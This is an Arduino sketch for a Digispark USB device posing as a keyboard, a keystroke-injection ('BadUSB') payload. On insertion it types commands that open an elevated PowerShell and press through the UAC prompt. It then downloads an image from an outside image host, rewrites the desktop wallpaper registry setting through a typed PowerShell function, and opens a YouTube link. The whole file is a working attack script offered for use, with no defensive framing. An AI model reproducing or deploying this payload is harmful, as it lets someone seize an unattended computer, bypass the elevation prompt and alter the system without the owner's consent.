#include "DigiKeyboard.h"

void setup() {
  // put your setup code here, to run once:
  // initialize the digital pin as an output.
  pinMode(0, OUTPUT); //LED on Model B
  pinMode(1, OUTPUT); //LED on Model A  or Pro
    DigiKeyboard.sendKeyStroke(0);
  SetLightOn();
  DigiKeyboard.delay(1000);
  SetLightOff();
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(1000);
  SetLightOn();
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(1000);
  DigiKeyboard.print("powershell");
  DigiKeyboard.delay(1000);
  SetLightOff();

  DigiKeyboard.sendKeyStroke(KEY_ENTER, MOD_CONTROL_LEFT | MOD_SHIFT_LEFT);
  SetLightOn();
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
  
  SetLightOff();
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  
  DigiKeyboard.print("Invoke-WebRequest -Uri \"https://i.ibb.co/sgbjGk9/image.png\" -OutFile \"C:\\photo.png\"");
  DigiKeyboard.delay(100);
  SetLightOn();
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  SetLightOff();
  DigiKeyboard.print("Function Set-WallPaper($Value)\n {\n  Set-ItemProperty -path 'HKCU:\\Control Panel\\Desktop\\' -name wallpaper -value $value; \n rundll32.exe user32.dll, UpdatePerUserSystemParameters; \n }");
  DigiKeyboard.delay(1000);
  SetLightOn();
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  SetPhotoToDesktop();
  SetPhotoToDesktop();
  SetPhotoToDesktop();
  SetPhotoToDesktop();
  SetPhotoToDesktop();
  SetPhotoToDesktop();
  SetPhotoToDesktop();
  SetPhotoToDesktop();
  SetPhotoToDesktop();
  SetPhotoToDesktop();
  SetPhotoToDesktop();
  SetPhotoToDesktop();
  DigiKeyboard.delay(2000);
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(600);
  DigiKeyboard.print("https://www.youtube.com/watch?v=FXsGCieXm1E");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2000);
  DigiKeyboard.sendKeyStroke(KEY_D, MOD_GUI_LEFT);


  
  ExitShell();
}

void loop() {
  // put your main code here, to run repeatedly:

 
}

void SetPhotoToDesktop()
{
  SetLightOff();
  DigiKeyboard.delay(500);
  SetLightOn();
  DigiKeyboard.print("Set-WallPaper -value \"c:\\photo.png\"");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  
}

void ExitShell()
{
  DigiKeyboard.print("exit");
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
}

void SetLightOn(){
  digitalWrite(0, HIGH);   // turn the LED on (HIGH is the voltage level)
  digitalWrite(1, HIGH);
}

void SetLightOff(){
  digitalWrite(0, LOW);    // turn the LED off by making the voltage LOW
  digitalWrite(1, LOW); 
}
